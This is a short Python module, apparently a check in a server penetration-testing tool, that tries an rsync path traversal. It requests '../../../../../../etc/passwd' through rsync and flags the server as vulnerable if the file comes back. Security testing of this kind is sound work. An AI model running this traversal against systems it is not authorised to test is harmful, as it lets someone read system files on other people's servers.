import subprocess
from ptsrvtester.protocols.rsync.utils.registry import rsync_env, rsync_url


__MODULELABEL__ = "Rsync path traversal detection"
__MODULECODE__ = "path_traversal"
__ORDER__ = 100


def _try_path_traversal(ctx):
    url = rsync_url(ctx, "../../../../../../etc/passwd")
    cmd = ["rsync", "--no-motd", url, "."]
    result = subprocess.run(
        cmd, capture_output=True, text=True, input="", env=rsync_env(ctx), timeout=ctx.timeout
    )
    
    if result.returncode != 0:
        err = result.stderr.strip().split('\n')

        ctx.out(f"Path traversal was unsuccesful {result.returncode}: {err[0]}", "OK", indent=4)
        return
    
    ctx.out(f"Path traversal successful", "VULN", indent=4)
    ctx.out(f"{result.stdout.split()}", "VULN", indent=4)
    

def run(ctx):
    _try_path_traversal(ctx)